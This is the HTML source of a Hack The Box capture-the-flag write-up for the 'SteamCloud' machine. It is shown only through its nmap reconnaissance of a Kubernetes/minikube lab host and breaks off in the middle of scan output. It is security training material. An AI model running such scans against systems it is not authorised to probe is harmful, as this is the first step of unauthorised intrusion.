@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HTB Writeup - SteamCloud (Easy) :: CyberSpider</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup of SteamCloud from Hack The Box." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/steamcloud/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="CyberSpider" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB Writeup - SteamCloud (Easy)">
+<meta property="og:description" content="Writeup of SteamCloud from Hack The Box." />
+<meta property="og:url" content="/posts/steamcloud/" />
+<meta property="og:site_name" content="CyberSpider" />
+
+  
+    <meta property="og:image" content="/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-07-21 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    cyberspider@ubuntu:~$
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/archive">archive</a></li>
+        
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/archive" >archive</a></li>
+        
+      
+        
+          <li><a href="/whoami" >whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/steamcloud/">HTB Writeup - SteamCloud (Easy)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-07-21</time><span class="post-author">CyberSpider</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/htb/">htb</a>&nbsp;
+      
+      #<a href="/tags/easy/">easy</a>&nbsp;
+      
+      #<a href="/tags/linux/">linux</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>The <code>SteamCloud</code> machine is an easy linux box.</p>
+<p><img src="/images/SteamCloud.png#center" alt="Scenario 1: Across columns"></p>
+<h2 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do a <code>nmap scan</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -sC -sV  -A 10.10.11.133    
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-07-19 21:14 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.133
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http          nginx 1.14.2
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.14.2
+</span></span><span style="display:flex;"><span>|_http-title: Welcome to nginx!
+</span></span><span style="display:flex;"><span>8443/tcp open  ssl/https-alt
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>minikube/organizationName<span style="color:#f92672">=</span>system:masters
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-07-18T06:42:04
+</span></span><span style="display:flex;"><span>|_Not valid after:  2026-07-18T06:42:04
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#e6db74">&#39;t have a title (application/json).
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| tls-alpn: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   h2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_  http/1.1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| fingerprint-strings: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   FourOhFourRequest: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HTTP/1.0 403 Forbidden
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Audit-Id: 7b80e79b-7b54-48e2-bc5d-220ca10b8f26
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Cache-Control: no-cache, private
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Type: application/json
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     X-Content-Type-Options: nosniff
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     X-Kubernetes-Pf-Flowschema-Uid: 70d21561-358b-4a05-8242-e6105982b66c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     X-Kubernetes-Pf-Prioritylevel-Uid: 053db608-66c1-4350-b594-d92bacaf9737
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Date: Thu, 20 Jul 2023 01:15:11 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Length: 212
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     {&#34;kind&#34;:&#34;Status&#34;,&#34;apiVersion&#34;:&#34;v1&#34;,&#34;metadata&#34;:{},&#34;status&#34;:&#34;Failure&#34;,&#34;message&#34;:&#34;forbidden: User &#34;system:anonymous&#34; cannot get path &#34;/nice ports,/Trinity.txt.bak&#34;&#34;,&#34;reason&#34;:&#34;Forbidden&#34;,&#34;details&#34;:{},&#34;code&#34;:403}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   GetRequest: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HTTP/1.0 403 Forbidden
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Audit-Id: 406f7305-7cf2-4f8f-acf9-2f2fb2e808df
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Cache-Control: no-cache, private
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Type: application/json
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     X-Content-Type-Options: nosniff
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     X-Kubernetes-Pf-Flowschema-Uid: 70d21561-358b-4a05-8242-e6105982b66c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     X-Kubernetes-Pf-Prioritylevel-Uid: 053db608-66c1-4350-b594-d92bacaf9737
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Date: Thu, 20 Jul 2023 01:15:10 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Length: 185
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     {&#34;kind&#34;:&#34;Status&#34;,&#34;apiVersion&#34;:&#34;v1&#34;,&#34;metadata&#34;:{},&#34;status&#34;:&#34;Failure&#34;,&#34;message&#34;:&#34;forbidden: User &#34;system:anonymous&#34; cannot get path &#34;/&#34;&#34;,&#34;reason&#34;:&#34;Forbidden&#34;,&#34;details&#34;:{},&#34;code&#34;:403}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   HTTPOptions: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HTTP/1.0 403 Forbidden
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Audit-Id: 18f532b2-8d4b-463d-bb0f-23b45d5e0803
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Cache-Control: no-cache, private
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Type: application/json
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     X-Content-Type-Options: nosniff
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     X-Kubernetes-Pf-Flowschema-Uid: 70d21561-358b-4a05-8242-e6105982b66c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     X-Kubernetes-Pf-Prioritylevel-Uid: 053db608-66c1-4350-b594-d92bacaf9737
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Date: Thu, 20 Jul 2023 01:15:10 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Length: 189
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_    {&#34;kind&#34;:&#34;Status&#34;,&#34;apiVersion&#34;:&#34;v1&#34;,&#34;metadata&#34;:{},&#34;status&#34;:&#34;Failure&#34;,&#34;message&#34;:&#34;forbidden: User &#34;system:anonymous&#34; cannot options path &#34;/&#34;&#34;,&#34;reason&#34;:&#34;Forbidden&#34;,&#34;details&#34;:{},&#34;code&#34;:403}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=7/19%Time=64B88A9D%P=x86_64-pc-linux-gn
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:u%r(GetRequest,22F,&#34;HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20406f7
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:305-7cf2-4f8f-acf9-2f2fb2e808df\r\nCache-Control:\x20no-cache,\x20priva
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:te\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:osniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x2070d21561-358b-4a05-8242-e6
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:105982b66c\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20053db608-66c1-4350-
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:b594-d92bacaf9737\r\nDate:\x20Thu,\x2020\x20Jul\x202023\x2001:15:10\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:GMT\r\nContent-Length:\x20185\r\n\r\n{\&#34;kind\&#34;:\&#34;Status\&#34;,\&#34;apiVersion\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&#34;:\&#34;v1\&#34;,\&#34;metadata\&#34;:{},\&#34;status\&#34;:\&#34;Failure\&#34;,\&#34;message\&#34;:\&#34;forbidden
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF::\x20User\x20\\\&#34;system:anonymous\\\&#34;\x20cannot\x20get\x20path\x20\\\&#34;/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\\\&#34;\&#34;,\&#34;reason\&#34;:\&#34;Forbidden\&#34;,\&#34;details\&#34;:{},\&#34;code\&#34;:403}\n&#34;)%r(HTTP
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Options,233,&#34;HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x2018f532b2-8d4
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:b-463d-bb0f-23b45d5e0803\r\nCache-Control:\x20no-cache,\x20private\r\nC
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ontent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosniff\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:r\nX-Kubernetes-Pf-Flowschema-Uid:\x2070d21561-358b-4a05-8242-e6105982b
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:66c\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20053db608-66c1-4350-b594-d9
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:2bacaf9737\r\nDate:\x20Thu,\x2020\x20Jul\x202023\x2001:15:10\x20GMT\r\n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Content-Length:\x20189\r\n\r\n{\&#34;kind\&#34;:\&#34;Status\&#34;,\&#34;apiVersion\&#34;:\&#34;v1\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&#34;,\&#34;metadata\&#34;:{},\&#34;status\&#34;:\&#34;Failure\&#34;,\&#34;message\&#34;:\&#34;forbidden:\x20Us
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:er\x20\\\&#34;system:anonymous\\\&#34;\x20cannot\x20options\x20path\x20\\\&#34;/\\\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&#34;\&#34;,\&#34;reason\&#34;:\&#34;Forbidden\&#34;,\&#34;details\&#34;:{},\&#34;code\&#34;:403}\n&#34;)%r(FourOhF
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ourRequest,24A,&#34;HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x207b80e79b-
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:7b54-48e2-bc5d-220ca10b8f26\r\nCache-Control:\x20no-cache,\x20private\r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosni
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x2070d21561-358b-4a05-8242-e61059
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:82b66c\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20053db608-66c1-4350-b594
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:-d92bacaf9737\r\nDate:\x20Thu,\x2020\x20Jul\x202023\x2001:15:11\x20GMT\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:r\nContent-Length:\x20212\r\n\r\n{\&#34;kind\&#34;:\&#34;Status\&#34;,\&#34;apiVersion\&#34;:\&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:v1\&#34;,\&#34;metadata\&#34;:{},\&#34;status\&#34;:\&#34;Failure\&#34;,\&#34;message\&#34;:\&#34;forbidden:\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0User\x20\\\&#34;system:anonymous\\\&#34;\x20cannot\x20get\x20path\x20\\\&#34;/nice
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20ports,/Trinity\.txt\.bak\\\&#34;\&#34;,\&#34;reason\&#34;:\&#34;Forbidden\&#34;,\&#34;details\&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF::{},\&#34;code\&#34;:403}\n&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Nmap done: 1 IP address (1 host up) scanned in 123.85 seconds
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">┌──(kali㉿kali)-[~]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">└─$ nmap -p- 10.10.11.133 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-19 21:45 EDT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host is up (0.12s latency).
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Not shown: 65527 closed tcp ports (conn-refused)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">PORT      STATE SERVICE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">22/tcp    open  ssh
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">80/tcp    open  http
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">2379/tcp  open  etcd-client
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">2380/tcp  open  etcd-server
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">8443/tcp  open  https-alt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">10249/tcp open  unknown
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">10250/tcp open  unknown
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">10256/tcp open  unknown
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Nmap done: 1 IP address (1 host up) scanned in 3760.97 seconds
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">┌──(kali㉿kali)-[~]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">└─$ nmap -sC -sV -p 22,2379,2380,8443,10249,10250,10256 10.10.11.133 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-19 22:07 EDT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Stats: 0:01:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service scan Timing: About 85.71% done; ETC: 22:08 (0:00:11 remaining)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Stats: 0:01:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service scan Timing: About 85.71% done; ETC: 22:08 (0:00:12 remaining)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Nmap scan report for 10.10.11.133
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host is up (0.12s latency).
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">PORT      STATE SERVICE          VERSION
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ssh-hostkey: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">2379/tcp  open  ssl/etcd-client?
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_ssl-date: TLS randomness does not represent time
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ssl-cert: Subject: commonName=steamcloud
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Not valid before: 2023-07-19T06:42:06
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_Not valid after:  2024-07-18T06:42:07
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| tls-alpn: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_  h2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">2380/tcp  open  ssl/etcd-server?
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ssl-cert: Subject: commonName=steamcloud
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Not valid before: 2023-07-19T06:42:06
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_Not valid after:  2024-07-18T06:42:07
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_ssl-date: TLS randomness does not represent time
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| tls-alpn: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_  h2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">8443/tcp  open  ssl/https-alt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Not valid before: 2023-07-18T06:42:04
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_Not valid after:  2026-07-18T06:42:04
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-title: Site doesn&#39;</span>t have a title <span style="color:#f92672">(</span>application/json<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>| tls-alpn: 
+</span></span><span style="display:flex;"><span>|   h2
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   FourOhFourRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">403</span> Forbidden
+</span></span><span style="display:flex;"><span>|     Audit-Id: d09285cf-227e-4419-9b4d-705ed21c026e
+</span></span><span style="display:flex;"><span>|     Cache-Control: no-cache, private
+</span></span><span style="display:flex;"><span>|     Content-Type: application/json
+</span></span><span style="display:flex;"><span>|     X-Content-Type-Options: nosniff
+</span></span><span style="display:flex;"><span>|     X-Kubernetes-Pf-Flowschema-Uid: 70d21561-358b-4a05-8242-e6105982b66c
+</span></span><span style="display:flex;"><span>|     X-Kubernetes-Pf-Prioritylevel-Uid: 053db608-66c1-4350-b594-d92bacaf9737
+</span></span><span style="display:flex;"><span>|     Date: Thu, <span style="color:#ae81ff">20</span> Jul <span style="color:#ae81ff">2023</span> 02:07:15 GMT
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">212</span>
+</span></span><span style="display:flex;"><span>|     <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;Status&#34;</span>,<span style="color:#e6db74">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#e6db74">&#34;metadata&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;Failure&#34;</span>,<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;forbidden: User &#34;</span>system:anonymous<span style="color:#e6db74">&#34; cannot get path &#34;</span>/nice ports,/Trinity.txt.bak<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;reason&#34;</span>:<span style="color:#e6db74">&#34;Forbidden&#34;</span>,<span style="color:#e6db74">&#34;details&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;code&#34;</span>:403<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>|   GetRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">403</span> Forbidden
+</span></span><span style="display:flex;"><span>|     Audit-Id: 80fe9101-e58b-4ded-aafe-844858d7c769
+</span></span><span style="display:flex;"><span>|     Cache-Control: no-cache, private
+</span></span><span style="display:flex;"><span>|     Content-Type: application/json
+</span></span><span style="display:flex;"><span>|     X-Content-Type-Options: nosniff
+</span></span><span style="display:flex;"><span>|     X-Kubernetes-Pf-Flowschema-Uid: 70d21561-358b-4a05-8242-e6105982b66c
+</span></span><span style="display:flex;"><span>|     X-Kubernetes-Pf-Prioritylevel-Uid: 053db608-66c1-4350-b594-d92bacaf9737
+</span></span><span style="display:flex;"><span>|     Date: Thu, <span style="color:#ae81ff">20</span> Jul <span style="color:#ae81ff">2023</span> 02:07:14 GMT
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">185</span>
+</span></span><span style="display:flex;"><span>|     <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;Status&#34;</span>,<span style="color:#e6db74">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#e6db74">&#34;metadata&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;Failure&#34;</span>,<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;forbidden: User &#34;</span>system:anonymous<span style="color:#e6db74">&#34; cannot get path &#34;</span>/<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;reason&#34;</span>:<span style="color:#e6db74">&#34;Forbidden&#34;</span>,<span style="color:#e6db74">&#34;details&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;code&#34;</span>:403<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>|   HTTPOptions: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">403</span> Forbidden
+</span></span><span style="display:flex;"><span>|     Audit-Id: 7844aecb-3752-4cb0-b356-d1a1e77b6817
+</span></span><span style="display:flex;"><span>|     Cache-Control: no-cache, private
+</span></span><span style="display:flex;"><span>|     Content-Type: application/json
+</span></span><span style="display:flex;"><span>|     X-Content-Type-Options: nosniff
+</span></span><span style="display:flex;"><span>|     X-Kubernetes-Pf-Flowschema-Uid: 70d21561-358b-4a05-8242-e6105982b66c
+</span></span><span style="display:flex;"><span>|     X-Kubernetes-Pf-Prioritylevel-Uid: 053db608-66c1-4350-b594-d92bacaf9737
+</span></span><span style="display:flex;"><span>|     Date: Thu, <span style="color:#ae81ff">20</span> Jul <span style="color:#ae81ff">2023</span> 02:07:14 GMT
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">189</span>
